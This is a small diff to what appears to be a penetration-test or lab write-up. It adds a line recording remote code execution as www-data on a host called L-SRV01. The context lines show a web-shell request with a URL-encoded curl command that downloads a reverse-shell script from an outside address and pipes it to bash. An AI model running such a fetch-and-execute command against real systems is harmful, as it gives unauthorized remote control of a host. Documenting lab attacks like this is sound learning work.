@@ -90,3 +90,4 @@ Now we have RCE on the host machine. WE can execute commands using `curl 192.168
 Now to get a reverse shell.
 `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.41%3A:9999%2F/revshell.sh%7Cbash%20%26'`
 
+Now we have RCE on [L-SRV01](../L-SRV01/L-SRV01.md) as www-data.
